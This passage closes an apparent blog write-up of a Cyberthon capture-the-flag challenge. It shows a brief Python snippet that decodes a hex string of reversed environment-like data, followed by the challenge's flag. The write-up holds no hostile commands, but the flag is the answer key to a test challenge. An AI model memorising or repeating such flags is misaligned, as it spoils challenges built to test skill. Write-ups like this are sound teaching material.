<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">streeng</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">unhexlify(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">b</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">6f686563616c7000544150007265646c6c2f7273752f3d486962732f6c61636f6c2f7273752f3a6e6e69622f6c61636f62732f7273752f3a2f7273752f3a6e696962732f3a6e696248006e69622f3a6e3d454d414e54534f33626431393637656573750039393135686563616c703d726c66007265646c6f72656279433d67616e30647b6e6f687479306c7033645f746c706d30636e315f6a3072705f3374334f48007d35746333656d6f682f3d454d6f686563616c702f4d4552007265646c54534f485f45544f2e302e302e30313d2f656d6f682f00356c6f686563616c7063616c702f7265647265646c6f686500</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">for</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> i </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">in</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> range</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">len</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(streeng),</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">):</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">    print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(streeng[i</span><span style="--shiki-light:#24292E;--shiki-dark:#FF79C6;">:</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">i</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">8</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">][::</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">])</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>That was easy enough.</p><h3 id="flag-4" tabindex="-1">Flag! <a class="header-anchor" href="#flag-4" aria-label="Permalink to â€œFlag!â€">â€‹</a></h3><p><code>Cyberthon{d0nt_d3pl0y_1nc0mpl3t3_pr0j3ct5}</code></p></div></div></main><footer class="VPDocFooter" data-v-7011f0d8 data-v-e257564d><!--[--><!--]--><!----><!----></footer><!--[--><!--]--></div></div></div><!--[--><!--]--></div></div><!----><!--[--><!--]--></div></div>
    <script>window.__VP_HASH_MAP__=JSON.parse("{\"about-me_index.md\":\"DcA_vmxN\",\"api-examples.md\":\"CkOuBZZS\",\"blog_index.md\":\"rPbq4i6E\",\"index.md\":\"BEw_psNO\",\"markdown-examples.md\":\"5C1dOAk0\",\"writeups_2021-03-02-dso-nus-ctf.md\":\"CWlHsggK\",\"writeups_2021-03-07-whitehacks.md\":\"C2A_3m7F\",\"writeups_2021-03-14-ctf-sg.md\":\"DORRXnIJ\",\"writeups_2021-03-27-umass-ctf.md\":\"BDpIrp0o\",\"writeups_2021-04-08-angstromctf-2021.md\":\"s2JreVXy\",\"writeups_2021-06-20-hsctf-8.md\":\"BzCZvhFM\",\"writeups_2021-06-26-cddc-2021.md\":\"DbOndx-U\",\"writeups_2021-09-05-cyberthon.md\":\"eXTsBky1\",\"writeups_2025-10-13-govtech-ai-ctf-2025-quals.md\":\"DTkDLnW8\",\"writeups_index.md\":\"DR_Jo5zI\"}");window.__VP_SITE_DATA__=JSON.parse("{\"lang\":\"en-US\",\"dir\":\"ltr\",\"title\":\"N00bcak's Purple Cave\",\"description\":\"Blogging Things When I Feel Like It\",\"base\":\"/\",\"head\":[],\"router\":{\"prefetchLinks\":true},\"appearance\":true,\"themeConfig\":{\"nav\":[{\"text\":\"Home\",\"link\":\"/\"},{\"text\":\"About\",\"link\":\"/about-me\"},{\"text\":\"CTF Writeups\",\"link\":\"/writeups\"},{\"text\":\"Blog\",\"link\":\"/blog\"}],\"socialLinks\":[{\"icon\":\"github\",\"link\":\"https://github.com/N00bcak\"}]},\"locales\":{},\"scrollOffset\":134,\"cleanUrls\":false,\"additionalConfig\":{}}");</script>
    
  </body>
</html>